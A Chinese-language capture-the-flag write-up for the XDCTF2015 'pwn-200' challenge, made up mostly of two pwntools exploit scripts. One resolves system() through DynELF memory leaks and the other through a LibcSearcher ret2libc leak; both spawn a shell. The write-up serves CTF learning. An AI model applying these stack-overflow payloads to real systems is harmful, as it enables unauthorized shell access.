# pwn-200 - 远程libc库未知

> 注：pwn.DynELF更通用，因为LibcSearcher可能有bug，经常匹配不到库。  

DynELF第一个参数是leak()函数，程序会自动添加address参数，不断尝试不同的address。然后write()函数将打印出address的内容，并将内容返回到DynELF模块，不断尝试匹配。  

DynELF.lookup(symb, lib)返回库函数的真实地址。  

Exp - DynELF:
```python
import pwn

pwn.context(arch='i386', os='linux', log_level='warning')

p = pwn.process('./pwn-200')
e = pwn.ELF('./pwn-200')

'''
for key, value in e.sym.items():
    print(key, (hex(value)))
pwn.pause()
'''

bss_addr = e.bss()
start_addr = pwn.p32(0x080483d0)    # start() address
read_plt = pwn.p32(e.plt['read'])
write_plt = pwn.p32(e.plt['write'])
pop_3_addr = pwn.p32(0x0804856c)    # pop for 3 times(12 bytes)


# this function will be repeated many times, with diffrent `address`
# `address` parameter will be auto-added. It takes place of write_got, so we don't need write_got
def leak(address):
    # return to start() after execution
    payload = b'A' * 0x6c + b'B' * 4 + write_plt + start_addr + pwn.p32(1) + pwn.p32(address) + pwn.p32(4) # p32(4)这个数字居然可以任意修改，1-256都可以！
    p.sendlineafter(b'Welcome to XDCTF2015~!\n', payload)
    data = p.recv(4)      # data = write(1, address, 4)
    return data

d = pwn.DynELF(leak=leak, elf=e)     # <class DynELF>     
system_addr = pwn.p32(d.lookup(symb='system', lib='libc'))

# read '/bin/sh\0' into bss_addr from STDIN, then return to system_addr
payload1 = b'A' * 0x6c + b'B' * 4 + read_plt + system_addr + pwn.p32(0) + pwn.p32(bss_addr) + pwn.p32(8)

#payload2 = b'A' * 0x6c + b'B' * 4 + read_plt + pop_3_addr + pwn.p32(0) + pwn.p32(bss_addr) + pwn.p32(8) 
#payload2 += system_addr + b'R' * 4 + pwn.p32(bss_addr)

p.sendlineafter(b'Welcome to XDCTF2015~!\n', payload1)  # or use payload2
p.sendline(b'/bin/sh\x00')

p.interactive()
```
  
  
适用于远程，用write_plt泄露出write的真实地址（位于write_got）后，用LibcSearcher自动匹配远程libc库，然后计算出libc基址，再计算system()和'/bin/sh'的地址.  

Exp - LibcSearcher:
```python
import pwn

pwn.context(arch='i386', os='linux', log_level='debug')

p = pwn.process('./pwn-200')
#p = pwn.remote('220.249.52.133', 41738)
e = pwn.ELF('./pwn-200')

main_addr = pwn.p32(0x080484be)
write_plt = pwn.p32(e.plt['write'])
write_got = pwn.p32(e.got['write'])

payload = b'A' * 108 + b'B' * 4 + write_plt + main_addr + pwn.p32(1) + write_got + pwn.p32(4)

p.sendlineafter(b'Welcome to XDCTF2015~!\n', payload)

write_addr = pwn.u32(p.recv(4))

import LibcSearcher

libc = LibcSearcher.LibcSearcher('write', write_addr)   # 自动匹配远程libc库
libc_addr = write_addr - libc.dump('write')     # libc库的基址
system_addr = pwn.p32(libc_addr + libc.dump('system'))
sh_addr = pwn.p32(libc_addr + libc.dump('str_bin_sh'))
#print(hex(pwn.u32(system_addr)))

payload2 = b'A' * 108 + b'B' * 4 + system_addr + b'C' * 4 + sh_addr

p.sendlineafter(b'Welcome to XDCTF2015~!\n', payload2)

p.interactive()
```